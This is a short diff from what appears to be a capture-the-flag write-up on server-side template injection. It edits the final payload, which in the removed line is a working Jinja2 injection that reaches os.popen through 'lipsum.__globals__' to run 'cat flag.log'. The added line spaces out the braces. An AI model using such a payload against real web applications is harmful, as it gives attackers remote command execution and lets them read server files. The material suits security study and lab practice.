@@ -31,6 +31,6 @@ This shows us a directory listing. We now have code execution, so we can simply 
 And we see it! A file named `flag.log`. Final payload:
 
 ```
-{"test": "{{lipsum.__globals__.os.popen('cat flag.log').read()}}"}
+{"test": "{ {lipsum.__globals__.os.popen('cat flag.log').read()} }"}
 ```
 
